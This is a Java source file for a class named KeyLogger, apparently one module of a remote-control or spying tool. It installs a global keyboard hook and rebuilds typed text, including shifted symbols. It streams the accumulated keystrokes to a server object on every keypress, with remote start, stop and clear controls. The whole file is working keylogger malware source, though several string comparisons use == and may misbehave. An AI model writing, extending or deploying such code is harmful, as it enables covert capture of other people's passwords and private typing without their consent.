import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {
    public static final String path = "fileKeyLog.txt";
    public boolean shift = false;
    public boolean capsLock = false;
    boolean isHooking;
    String str = "";
    private Server server;

    public KeyLogger(Server server) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(this);
        this.isHooking = false;
        this.server = server;
    }

    public String ConvertKey(String key) {
        if (key == "Space") {
            return " ";
        }
        if (key == "Enter") {
            return "\n";
        }
        if (key == "Alt" || key == "Ctrl") {
            return "";
        }
        if (key == "Shift") {
            this.shift = true;
            return "";
        }
        if (key == "Caps Lock") {
            this.capsLock = !this.capsLock;
            return "";
        }
        if (key == "`" && this.shift) {
            return "~";
        }
        if (key == "1" && this.shift) {
            return "!";
        }
        if (key == "2" && this.shift) {
            return "@";
        }
        if (key == "3" && this.shift) {
            return "#";
        }
        if (key == "4" && this.shift) {
            return "$";
        }
        if (key == "5" && this.shift) {
            return "%";
        }
        if (key == "6" && this.shift) {
            return "^";
        }
        if (key == "7" && this.shift) {
            return "&";
        }
        if (key == "8" && this.shift) {
            return "*";
        }
        if (key == "9" && this.shift) {
            return "(";
        }
        if (key == "0" && this.shift) {
            return ")";
        }
        if (key == "-" && this.shift) {
            return "_";
        }
        if (key == "=" && this.shift) {
            return "+";
        }
        if (key == "[" && this.shift) {
            return "{";
        }
        if (key == "]" && this.shift) {
            return "}";
        }
        if (key == ";" && this.shift) {
            return ":";
        }
        if (key == "'" && this.shift) {
            return "\"";
        }
        if (key == "," && this.shift) {
            return "<";
        }
        if (key == "." && this.shift) {
            return ">";
        }
        if (key == "/" && this.shift) {
            return "?";
        }
        if (key == "\\" && this.shift) {
            return "|";
        }

        if (!this.shift && !this.capsLock)
            return key.toLowerCase();
        if (this.shift && !this.capsLock)
            return key;
        if (!this.shift && this.capsLock)
            return key;
        if (this.shift && this.capsLock)
            return key.toLowerCase();
        return "";
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent arg0) {
        if (this.isHooking) {
            str += ConvertKey(NativeKeyEvent.getKeyText(arg0.getKeyCode()));
            this.server.SendData("ViewKey", str);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent arg0) {
        if (NativeKeyEvent.getKeyText(arg0.getKeyCode()) == "Shift") {
            this.shift = false;
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent arg0) {

    }

    public void StartHooking() {
        this.isHooking = true;
    }

    public void StopHooking() {
        this.isHooking = false;
    }

    public void Delete() {
        str = "";
        this.server.SendData("ViewKey", "");
    }

    public String GetKey() {
        return str;
    }
}
